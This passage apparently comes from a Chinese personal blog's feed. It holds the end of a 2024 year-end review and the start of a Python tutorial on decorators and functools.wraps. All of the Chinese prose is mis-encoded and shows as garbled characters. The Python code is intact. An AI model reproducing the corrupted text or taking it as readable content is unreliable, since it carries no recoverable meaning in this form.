ã€‚</p><p>å·¥ä½œä¹‹åæœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç›´è§‚æ„Ÿå—å°±æ˜¯ï¼Œæ—¶é—´è¢«åˆ†çš„å¾ˆæ•£ï¼Œç²¾åŠ›è¢«åˆ†çš„å¾ˆä¹±ã€‚å¯¼è‡´çš„åæœæ˜¯ï¼Œæˆ‘æ²¡æœ‰ä¸€ä¸ªå¾ˆè§„å¾‹çš„è®¡åˆ’æ¸…å•å»åšè‡ªå·±æƒ³åšçš„äº‹æƒ…ã€‚å½“ç„¶æˆ‘è§‰å¾—è¿™æ˜¯æˆ‘çš„ä¸ªäººåŸå› é€ æˆçš„ï¼Œè¿™ä¸€ç‚¹æˆ‘éœ€è¦åæ€ã€‚</p><h3 id="æ—…è¡Œ"><a href="#æ—…è¡Œ" class="headerlink" title="æ—…è¡Œ"></a>æ—…è¡Œ</h3><p>å·¥ä½œåå‘ç°ï¼Œæ—…è¡Œæ˜¯ä¸€ä¸ªå¾ˆå¥½æ”¾ç©ºè‡ªå·±çš„æ–¹å¼ï¼Œå½“äº‹äººç°åœ¨å°±æ˜¯éå¸¸åæ‚”ï¼Œä¸ºä»€ä¹ˆè¯»ä¹¦çš„æ—¶å€™æ²¡æœ‰å¤šå»å‡ ä¸ªåœ°æ–¹ç©ç©å‘¢ï¼Ÿ</p><p>ä»Šå¹´ä¸€å…±å»äº†å››ä¸ªåœ°æ–¹ï¼Œåˆ†åˆ«æ˜¯ï¼šå¹¿å…ƒã€å…°å·ã€å»¶å®‰ã€ç”˜å—ã€‚</p><p>æ˜å¹´çš„æœŸå¾…ï¼šå¸Œæœ›èƒ½å‡ºå›½ç©ç©ï½</p><h3 id="èŠ±é’±"><a href="#èŠ±é’±" class="headerlink" title="èŠ±é’±"></a>èŠ±é’±</h3><p>ä»Šå¹´å‡ ç¬”å¤§çš„å¼€é”€ä¸»è¦èŠ±åœ¨ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ä¸Šï¼š</p><h4 id="ä¹°è½¦"><a href="#ä¹°è½¦" class="headerlink" title="ä¹°è½¦"></a>ä¹°è½¦</h4><p>ä»Šå¹´è§‰å¾—èŠ±çš„æœ€å€¼çš„ä¸€ç¬”é’±å°±æ˜¯ä¹°äº†ä¸€å°è½¦ã€‚å°½ç®¡å®ƒæ˜¯ä¸€è¾†A00çº§å››é—¨çº¯ç”µè½¦æµ·é¸¥ğŸš—ï¼Œä½†æ˜¯å®ƒæå¤§çš„æ‰©å¤§äº†æˆ‘çš„å‡ºè¡ŒèŒƒå›´ã€‚</p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/7.jpeg" alt="7"></p><h4 id="è£…ä¿®"><a href="#è£…ä¿®" class="headerlink" title="è£…ä¿®"></a>è£…ä¿®</h4><p>ä¸å¾—ä¸è¯´ï¼Œè‡ªè£…çœŸæ˜¯ä¸€é—¨æŠ€æœ¯æ´»ã€‚é™†é™†ç»­ç»­ä»äº¤æˆ¿åˆ°è£…ä¿®å·²ç»è¿‡å»äº†å°†è¿‘3å¹´äº†ã€‚ç°åœ¨æˆ¿å­æ€»ç®—æ˜¯ç¡¬è£…ç»“æŸäº†ã€‚ä¸å¾—ä¸è¯´ï¼Œè¸©äº†ä¸å°‘å‘ã€‚ä»Šå¹´ç»™æˆ¿å­è£…ä¿®ä¸ŠèŠ±äº†å¤§æ¦‚6wå—é’±ï¼Œå…¶ä¸­æˆ‘ä¸ªäººæ¯”è¾ƒæ»¡æ„çš„å‡ ä»¶å•å“å¦‚ä¸‹ï¼š</p><h5 id="é¤å…ç¯ï¼šä¹ç±³å“æœˆè‰ºæœ¯ç¯"><a href="#é¤å…ç¯ï¼šä¹ç±³å“æœˆè‰ºæœ¯ç¯" class="headerlink" title="é¤å…ç¯ï¼šä¹ç±³å“æœˆè‰ºæœ¯ç¯"></a>é¤å…ç¯ï¼šä¹ç±³å“æœˆè‰ºæœ¯ç¯</h5><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/8.jpg" alt="8"></p><h5 id="ç”µè§†ï¼šTCL-T7k-85"><a href="#ç”µè§†ï¼šTCL-T7k-85" class="headerlink" title="ç”µè§†ï¼šTCL T7k 85"></a>ç”µè§†ï¼šTCL T7k 85</h5><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/9.jpg" alt="9"></p><h5 id="é©¬æ¡¶ï¼šæ’æ´H35pro"><a href="#é©¬æ¡¶ï¼šæ’æ´H35pro" class="headerlink" title="é©¬æ¡¶ï¼šæ’æ´H35pro"></a>é©¬æ¡¶ï¼šæ’æ´H35pro</h5><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/16.jpg" alt="16"></p><h5 id="æ™ºèƒ½é—¨é”ï¼šå¾·æ–½æ›¼Q50M-Pro"><a href="#æ™ºèƒ½é—¨é”ï¼šå¾·æ–½æ›¼Q50M-Pro" class="headerlink" title="æ™ºèƒ½é—¨é”ï¼šå¾·æ–½æ›¼Q50M Pro"></a>æ™ºèƒ½é—¨é”ï¼šå¾·æ–½æ›¼Q50M Pro</h5><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/17.jpg" alt="17"></p><h5 id="äººä½“å·¥å­¦æ¤…ï¼šè¥¿æ˜ŠM57CäºŒä»£"><a href="#äººä½“å·¥å­¦æ¤…ï¼šè¥¿æ˜ŠM57CäºŒä»£" class="headerlink" title="äººä½“å·¥å­¦æ¤…ï¼šè¥¿æ˜ŠM57CäºŒä»£"></a>äººä½“å·¥å­¦æ¤…ï¼šè¥¿æ˜ŠM57CäºŒä»£</h5><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/18.jpg" alt="18"></p><h4 id="ä¹°é‡‘å­"><a href="#ä¹°é‡‘å­" class="headerlink" title="ä¹°é‡‘å­"></a>ä¹°é‡‘å­</h4><p>åœ¨ç°å®å› ç´ ä¸‹ï¼Œæˆ‘ä¹Ÿå¼€å§‹äº†æ”’äº”é‡‘çš„è®¡åˆ’ã€‚</p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/1.jpg" alt="1"></p><h4 id="ä¹°çƒæ†"><a href="#ä¹°çƒæ†" class="headerlink" title="ä¹°çƒæ†"></a>ä¹°çƒæ†</h4><p>ä¹°çƒæ†çš„å¥‘æœºè¿˜æ˜¯åœ¨ä»Šå¹´8æœˆä»½åœ¨è¥¿å®‰çœ‹äº†ä¸€åœºæ–¯è¯ºå…‹çš„æ¯”èµ›ï¼Œå¹³æ—¶åªèƒ½åœ¨ç”µè§†ä¸Šçœ‹åˆ°çš„é¡¶çº§é€‰æ‰‹ï¼Œç°åœ¨ä¹Ÿèƒ½äº²çœ¼æ‰€è§ï¼Œæˆ‘ä¹°çš„æ˜¯æ€»å†³èµ›çš„ä¸ŠåŠåœºï¼Œå½“æ—¶æˆ‘æ„Ÿè§‰å¯èƒ½æ˜¯ç‰¹é²å§†æ™®vså¥¥æ²™åˆ©æ–‡ï¼Œæ²¡æƒ³åˆ°æœ€åæ˜¯å¯¹é˜µå›§å“¥ï¼Œè¯¥è¯´ä¸è¯´ï¼Œåœ¨ç°åœºçœ‹ç¡®å®æ„Ÿè§‰ä¸ä¸€æ ·ï¼Œæˆ‘è¿˜æœ‰å¾ˆé•¿ä¸€æ®µè·¯è¦èµ°å•Šã€‚</p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/5.jpeg" alt="5"></p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/4.jpeg" alt="4"></p><p>è¿™ç¬”å¼€é”€å¹¶ä¸ç®—å¾ˆå¤§ï¼Œä½†æ˜¯å®ƒä½“ç°äº†æˆ‘çš„å†³å¿ƒã€‚2024å¹´é›†ä¸­åŠ›é‡ã€æŠ•å…¥å¿ƒæ€çš„ä¸€é—¨æŠ€æœ¯å‹å·¥ä½œï¼Œå°±æ˜¯æ‰“å°çƒã€‚ä¹‹å‰æˆ‘æ˜¯çæ‰“ï¼Œå®Œå…¨é è›®åŠ›ï¼Œä»Šå¹´æˆ‘è½¬å˜äº†ï¼Œæˆ‘è§‰å¾—å¿…é¡»æ­£å„¿å…«ç»åœ¨è¿™é¡¹è¿åŠ¨ä¸ŠèŠ±ç‚¹å¿ƒæ€ï¼Œäºæ˜¯æˆ‘äºŒè¯ä¸è¯´ï¼Œåœ¨11æœˆä»½çš„æ—¶å€™ç»™è‡ªå·±ç²¾æŒ‘ç»†é€‰ä¹°äº†ä¸€ä¸ªçƒæ†ï¼Œæˆ‘å¤ªæƒ³è¿›æ­¥äº†ã€‚</p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/6.jpg" alt="6"></p><h4 id="æ¼”å”±ä¼š"><a href="#æ¼”å”±ä¼š" class="headerlink" title="æ¼”å”±ä¼š"></a>æ¼”å”±ä¼š</h4><p>ä»Šå¹´çœŸæ˜¯æ‰å †åŠæ¼”å”±ä¼šçš„ä¸€å¹´ï¼Œè¥¿å®‰å¥¥ä½“å‡ ä¹æ¯å‘¨éƒ½ä¼šæœ‰æ˜æ˜Ÿæ¥å¼€æ¼”å”±ä¼šã€‚è´«ç©·çš„æˆ‘åœ¨ä»Šå¹´ä¹Ÿèµ¶äº†å‡ åœºæ¼”å”±ä¼šï¼Œåœ¨è¿™é‡Œæˆ‘è¦æ„Ÿè°¢æˆ‘çš„åŒäº‹å’Œæœ‹å‹ï¼Œå› ä¸ºæ²¡æœ‰ä»–ä»¬å¸®å¿™æŠ¢ç¥¨ï¼Œæˆ‘æ˜¯ä¸€åœºæ¼”å”±ä¼šéƒ½çœ‹ä¸äº†å•Šã€‚</p><h5 id="è®¸åµ©2024å‘¼å¸ä¹‹é‡æ¼”å”±ä¼š"><a href="#è®¸åµ©2024å‘¼å¸ä¹‹é‡æ¼”å”±ä¼š" class="headerlink" title="è®¸åµ©2024å‘¼å¸ä¹‹é‡æ¼”å”±ä¼š"></a>è®¸åµ©2024å‘¼å¸ä¹‹é‡æ¼”å”±ä¼š</h5><p>æ€»ç»“ï¼šäººç”Ÿçš„ç¬¬ä¸€åœºä¸ªäººæ¼”å”±ä¼šï¼Œæ¥çœ‹æœ€å–œæ¬¢çš„æ­Œæ‰‹</p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/10.JPG" alt="10"></p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/11.JPG" alt="11"></p><h5 id="æå®—ç››2024æœ‰æ­Œä¹‹å¹´æ¼”å”±ä¼š"><a href="#æå®—ç››2024æœ‰æ­Œä¹‹å¹´æ¼”å”±ä¼š" class="headerlink" title="æå®—ç››2024æœ‰æ­Œä¹‹å¹´æ¼”å”±ä¼š"></a>æå®—ç››2024æœ‰æ­Œä¹‹å¹´æ¼”å”±ä¼š</h5><p>æ€»ç»“ï¼šå¹´å°‘ä¸å¬æå®—ç››ï¼Œå¬æ‡‚å·²æ˜¯ä¸æƒ‘å¹´</p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/12.jpg" alt="12"></p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/13.JPG" alt="13"></p><h5 id="å‡¤å‡°ä¼ å¥‡2024å‰ç¥¥å¦‚æ„æ¼”å”±ä¼š"><a href="#å‡¤å‡°ä¼ å¥‡2024å‰ç¥¥å¦‚æ„æ¼”å”±ä¼š" class="headerlink" title="å‡¤å‡°ä¼ å¥‡2024å‰ç¥¥å¦‚æ„æ¼”å”±ä¼š"></a>å‡¤å‡°ä¼ å¥‡2024å‰ç¥¥å¦‚æ„æ¼”å”±ä¼š</h5><p>æ€»ç»“ï¼šå†›è®­å°±å®Œäº‹äº†</p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/14.JPG" alt="14"></p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/15.JPG" alt="15"></p><h3 id="çˆ±æƒ…"><a href="#çˆ±æƒ…" class="headerlink" title="çˆ±æƒ…"></a>çˆ±æƒ…</h3><p>ä»Šå¹´æ˜¯æˆ‘ä»¬ä¸€èµ·èµ°è¿‡çš„ç¬¬10å¹´ã€‚å¾ˆå¹¸è¿ï¼Œä¹Ÿå¾ˆæ„Ÿæ¿€ã€‚</p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/2.JPG" alt="2"></p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/19.jpg" alt="19"></p><h3 id="å­¦ä¹ "><a href="#å­¦ä¹ " class="headerlink" title="å­¦ä¹ "></a>å­¦ä¹ </h3><h4 id="å­¦ä¹ æ—¥è¯­"><a href="#å­¦ä¹ æ—¥è¯­" class="headerlink" title="å­¦ä¹ æ—¥è¯­"></a>å­¦ä¹ æ—¥è¯­</h4><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/20.jpg" alt="20"></p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/21.jpg" alt="21"></p><h4 id="è¯»ä¹¦"><a href="#è¯»ä¹¦" class="headerlink" title="è¯»ä¹¦"></a>è¯»ä¹¦</h4><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/22.jpg" alt="22"></p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/23.jpg" alt="23"></p><p><img src="/2024/12/18/2024å¹´ç»ˆæ€»ç»“/24.jpg" alt="24"></p><h3 id="2025æƒ³æ³•"><a href="#2025æƒ³æ³•" class="headerlink" title="2025æƒ³æ³•"></a>2025æƒ³æ³•</h3><p>è¯»ä¹¦ï¼šè¯»å®Œåæœ¬ä¹¦ğŸ“–</p><p>è€ƒè¯ï¼šè€ƒä¸‹æ—¥è¯­N2ğŸ˜Š</p><p>æ”’é’±ï¼šæ”’å¤Ÿ15wå—é’±ğŸ’°</p><p>æ”¶è—ï¼šä¸¤åŒå–œæ¬¢çš„çƒé‹ğŸ‘Ÿ</p><p>æ—…è¡Œï¼šå‡ºå›½ç©ã€çœ‹é›ªå±±ğŸ”ï¸</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;çªç„¶å‘ç°å·²ç»ä¸€å¹´å¤šæ²¡æœ‰æ›´æ–°åšå®¢äº†ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®è¿™ç§å¹´ç»ˆæ€»ç»“æˆ‘ä¸€ç›´å°±æƒ³å»å†™ã€‚å› ä¸ºæ¯åˆ°å¹´åº•ï¼Œå°±ä¼šæœ‰å„ç§å„æ ·APPçš„å¹´ç»ˆæ€»ç»“å‡ºç°ï¼Œè¿™äº›æ€»ç»“å¯ä»¥å¿«é€Ÿçš„å¸¦æˆ‘è¿‡å®Œè¿™ä¸€å¹´åœ¨è¿™æ¬¾APPä¸Šåšäº†äº›ä»€ä¹ˆäº‹æƒ…ï¼ŒAPPä¸Šçš„æŸä¸€ä¸ªæ€»ç»“ç‚¹ä¼šè¿…é€Ÿåœ°å°†æˆ‘æ‹‰å›åˆ°ä¸€å¹´ä¸­çš„æŸä¸ªæ—¶åˆ»ï¼Œè¯´çœŸçš„ï¼Œæˆ‘å¾ˆå–œæ¬¢è¿™æ ·çš„
      
    
    </summary>
    
    
      <category term="éšç¬”" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>PythonTips(Part 2)</title>
    <link href="elssm.github.io/2023/10/18/PythonTips-Part-2/"/>
    <id>elssm.github.io/2023/10/18/PythonTips-Part-2/</id>
    <published>2023-10-18T13:29:21.000Z</published>
    <updated>2023-10-18T13:31:16.191Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å…ƒç¼–ç¨‹"><a href="#å…ƒç¼–ç¨‹" class="headerlink" title="å…ƒç¼–ç¨‹"></a>å…ƒç¼–ç¨‹</h3><h4 id="åœ¨å‡½æ•°ä¸Šæ·»åŠ åŒ…è£…å™¨"><a href="#åœ¨å‡½æ•°ä¸Šæ·»åŠ åŒ…è£…å™¨" class="headerlink" title="åœ¨å‡½æ•°ä¸Šæ·»åŠ åŒ…è£…å™¨"></a>åœ¨å‡½æ•°ä¸Šæ·»åŠ åŒ…è£…å™¨</h4><p>å¦‚æœæƒ³åœ¨å‡½æ•°ä¸Šæ·»åŠ ä¸€ä¸ªåŒ…è£…å™¨ï¼Œå¢åŠ é¢å¤–çš„æ“ä½œå¤„ç†(æ¯”å¦‚æ—¥å¿—ã€è®¡æ—¶ç­‰)ã€‚å¯ä»¥å®šä¹‰ä¸€ä¸ªè£…é¥°å™¨å‡½æ•°ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timethis</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(func.__name__, end-start)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹æ˜¯ä½¿ç”¨è£…é¥°å™¨çš„ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@timethis</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    Counts down</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    '''</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        n -= <span class="number">1</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown(<span class="number">100000</span>)</span><br><span class="line">countdown <span class="number">0.008917808532714844</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown(<span class="number">10000000</span>)</span><br><span class="line">countdown <span class="number">0.87188299392912</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªè£…é¥°å™¨å°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°å¹¶è¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œå¦‚ä¸‹é¢è¿™ç§å†™æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@timethis</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>å…¶å®ç±»ä¼¼äºä¸‹é¢è¿™ç§å†™æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">countdown = timethis(countdown)</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå†…ç½®çš„è£…é¥°å™¨æ¯”å¦‚<code>@staticmethod</code>,<code>@classmethod</code>,<code>@property</code>åŸç†ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢è¿™ä¸¤ä¸ªä»£ç ç‰‡æ®µæ˜¯ç­‰ä»·çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span><span class="params">(cls)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span><span class="params">(cls)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    method = classmethod(method)</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„<code>wrapper()</code>å‡½æ•°ä¸­ï¼Œ è£…é¥°å™¨å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªä½¿ç”¨<code>*args</code>å’Œ<code>**kwargs</code>æ¥æ¥å—ä»»æ„å‚æ•°çš„å‡½æ•°ã€‚åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢è°ƒç”¨äº†åŸå§‹å‡½æ•°å¹¶å°†å…¶ç»“æœè¿”å›ï¼Œä¸è¿‡ä½ è¿˜å¯ä»¥æ·»åŠ å…¶ä»–é¢å¤–çš„ä»£ç (æ¯”å¦‚è®¡æ—¶)ã€‚ ç„¶åè¿™ä¸ªæ–°çš„å‡½æ•°åŒ…è£…å™¨è¢«ä½œä¸ºç»“æœè¿”å›æ¥ä»£æ›¿åŸå§‹å‡½æ•°ã€‚</p><p>éœ€è¦å¼ºè°ƒçš„æ˜¯è£…é¥°å™¨å¹¶ä¸ä¼šä¿®æ”¹åŸå§‹å‡½æ•°çš„å‚æ•°ç­¾åä»¥åŠè¿”å›å€¼ã€‚ä½¿ç”¨<code>*args</code>å’Œ<code>**kwargs</code>ç›®çš„å°±æ˜¯ç¡®ä¿ä»»ä½•å‚æ•°éƒ½èƒ½é€‚ç”¨ã€‚è€Œè¿”å›ç»“æœå€¼åŸºæœ¬éƒ½æ˜¯è°ƒç”¨åŸå§‹å‡½æ•°<code>func(*args, **kwargs)</code>çš„è¿”å›ç»“æœï¼Œå…¶ä¸­<code>func</code>å°±æ˜¯åŸå§‹å‡½æ•°ã€‚</p><p>åˆšå¼€å§‹å­¦ä¹ è£…é¥°å™¨çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ä¸€äº›ç®€å•çš„ä¾‹å­æ¥è¯´æ˜ï¼Œæ¯”å¦‚ä¸Šé¢æ¼”ç¤ºçš„è¿™ä¸ªã€‚ä¸è¿‡å®é™…åœºæ™¯ä½¿ç”¨æ—¶ï¼Œè¿˜æ˜¯æœ‰ä¸€äº›ç»†èŠ‚é—®é¢˜è¦æ³¨æ„çš„ã€‚æ¯”å¦‚ä¸Šé¢ä½¿ç”¨<code>@wraps(func)</code>æ³¨è§£æ˜¯å¾ˆé‡è¦çš„ï¼Œå®ƒèƒ½ä¿ç•™åŸå§‹å‡½æ•°çš„å…ƒæ•°æ®ã€‚</p><h4 id="åˆ›å»ºè£…é¥°å™¨æ—¶ä¿ç•™å‡½æ•°å…ƒä¿¡æ¯"><a href="#åˆ›å»ºè£…é¥°å™¨æ—¶ä¿ç•™å‡½æ•°å…ƒä¿¡æ¯" class="headerlink" title="åˆ›å»ºè£…é¥°å™¨æ—¶ä¿ç•™å‡½æ•°å…ƒä¿¡æ¯"></a>åˆ›å»ºè£…é¥°å™¨æ—¶ä¿ç•™å‡½æ•°å…ƒä¿¡æ¯</h4><p>ä»»ä½•æ—¶å€™ä½ å®šä¹‰è£…é¥°å™¨çš„æ—¶å€™ï¼Œéƒ½åº”è¯¥ä½¿ç”¨<code>functools</code>åº“ä¸­çš„<code>@wraps</code>è£…é¥°å™¨æ¥æ³¨è§£åº•å±‚åŒ…è£…å‡½æ•°ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timethis</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(func.__name__, end-start)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªè¢«åŒ…è£…åçš„å‡½æ•°å¹¶æ£€æŸ¥å®ƒçš„å…ƒä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@timethis</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    Counts down</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    '''</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        n -= <span class="number">1</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown(<span class="number">100000</span>)</span><br><span class="line">countdown <span class="number">0.008917808532714844</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__name__</span><br><span class="line"><span class="string">'countdown'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__doc__</span><br><span class="line"><span class="string">'\n\tCounts down\n\t'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__annotations__</span><br><span class="line">&#123;<span class="string">'n'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ç¼–å†™è£…é¥°å™¨çš„æ—¶å€™å¤åˆ¶å…ƒä¿¡æ¯æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„éƒ¨åˆ†ã€‚å¦‚æœä½ å¿˜è®°äº†ä½¿ç”¨<code>@wraps</code>ï¼Œ é‚£ä¹ˆä½ ä¼šå‘ç°è¢«è£…é¥°å‡½æ•°ä¸¢å¤±äº†æ‰€æœ‰æœ‰ç”¨çš„ä¿¡æ¯ã€‚æ¯”å¦‚å¦‚æœå¿½ç•¥<code>@wraps</code>åçš„æ•ˆæœæ˜¯ä¸‹é¢è¿™æ ·çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__name__</span><br><span class="line"><span class="string">'wrapper'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__doc__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__annotations__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><code>@wraps</code>æœ‰ä¸€ä¸ªé‡è¦ç‰¹å¾æ˜¯å®ƒèƒ½è®©ä½ é€šè¿‡å±æ€§<code>__wrapped__</code>ç›´æ¥è®¿é—®è¢«åŒ…è£…å‡½æ•°ã€‚ä¾‹å¦‚:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__wrapped__(<span class="number">100000</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="è§£é™¤ä¸€ä¸ªè£…é¥°å™¨"><a 